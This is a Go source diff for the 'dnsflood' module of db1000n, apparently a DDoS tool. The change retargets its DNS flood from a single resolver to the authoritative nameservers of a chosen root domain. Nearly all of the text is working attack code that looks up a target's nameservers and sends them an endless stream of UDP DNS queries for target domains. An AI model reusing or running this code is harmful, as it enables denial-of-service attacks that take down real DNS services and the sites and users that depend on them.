@@ -3,7 +3,6 @@ package dnsflood
 import (
 	"github.com/Arriven/db1000n/src/logs"
 	"github.com/miekg/dns"
-	"math/big"
 	"math/rand"
 	"net"
 	"time"
@@ -12,13 +11,14 @@ import (
 type Config struct {
 	Verbose       bool
 	Iterative     bool
-	Resolver      string
-	TargetDomains []string
+	RootDomain    string   `json:"root_domain"`
+	TargetDomains []string `json:"target_domains"`
 	IntervalMs    int
 }
 type DnsStress struct {
-	Logger *logs.Logger
-	Config *Config
+	Logger      *logs.Logger
+	Config      *Config
+	Nameservers []string
 }
 
 func setDefaults(c *Config) {
@@ -35,29 +35,32 @@ func setDefaults(c *Config) {
 
 func Start(stopChan chan bool, logger *logs.Logger, config *Config) error {
 	setDefaults(config)
-	s := &DnsStress{
-		Logger: logger,
-		Config: config,
+
+	nameservers, err := getNameservers(config.RootDomain)
+	if err != nil {
+		logger.Error("Unable to parse the nameserver address for domain %s, %w", config.RootDomain, err)
 	}
 
-	parsedResolver, err := ParseIPPort(config.Resolver)
-	config.Resolver = parsedResolver
+	s := &DnsStress{
+		Logger:      logger,
+		Config:      config,
+		Nameservers: nameservers,
+	}
+
 	if err != nil {
-		s.Logger.Error("Unable to parse the resolver address", err)
+		logger.Error("Unable to parse the nameserver address, %w", err)
 		return err
 	}
 
-	logger.Info("Stressing resolver: %s.", config.Resolver)
+	logger.Info("Stressing nameservers for domain: %s.", config.RootDomain)
 	logger.Info("Target domains: %v.", config.TargetDomains)
 
-	go s.linearResolver(stopChan, config.TargetDomains, config.IntervalMs)
+	go s.Stress(stopChan, config.TargetDomains, config.IntervalMs)
 
 	return nil
 }
 
-func (s DnsStress) linearResolver(stopChan chan bool, domains []string, intervalMs int) {
-	maxRequestID := big.NewInt(65536)
-
+func (s DnsStress) Stress(stopChan chan bool, domains []string, intervalMs int) {
 	messages := make([]*dns.Msg, len(domains))
 	for i, d := range domains {
 		message := new(dns.Msg).SetQuestion(d, dns.TypeA)
@@ -72,35 +75,31 @@ func (s DnsStress) linearResolver(stopChan chan bool, domains []string, interval
 		case <-stopChan:
 			return
 		default:
-			sendMessages(s.Config.Resolver, messages, maxRequestID)
+			randomNameserver := s.Nameservers[rand.Intn(len(s.Nameservers))]
+			sendMessages(randomNameserver, messages)
 		}
 		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
 	}
 }
 
-func sendMessages(resolver string, messages []*dns.Msg, maxRequestID *big.Int) {
-	dnsConn, _ := net.Dial("udp", resolver)
+func sendMessages(nameserver string, messages []*dns.Msg) {
+	dnsConn, _ := net.Dial("udp", nameserver+":53")
 	co := &dns.Conn{Conn: dnsConn}
 	for _, message := range messages {
 		newId := rand.Intn(65536)
 		message.Id = uint16(newId)
 		_ = co.WriteMsg(message)
-
 	}
 	defer co.Close()
 }
 
-// ParseIPPort returns a valid string that can be passed to net.Dial, containing both the IP
-// address and the port number.
-func ParseIPPort(input string) (string, error) {
-	if ip := net.ParseIP(input); ip != nil {
-		// A "pure" IP was passed, with no port number (or name)
-		return net.JoinHostPort(ip.String(), "53"), nil
-	}
-	// Input has both address and port
-	host, port, err := net.SplitHostPort(input)
+func getNameservers(rootDomain string) (res []string, err error) {
+	nameservers, err := net.LookupNS(rootDomain)
 	if err != nil {
-		return input, err
+		return nil, err
 	}
-	return net.JoinHostPort(host, port), nil
+	for _, nameserver := range nameservers {
+		res = append(res, nameserver.Host)
+	}
+	return res, nil
 }
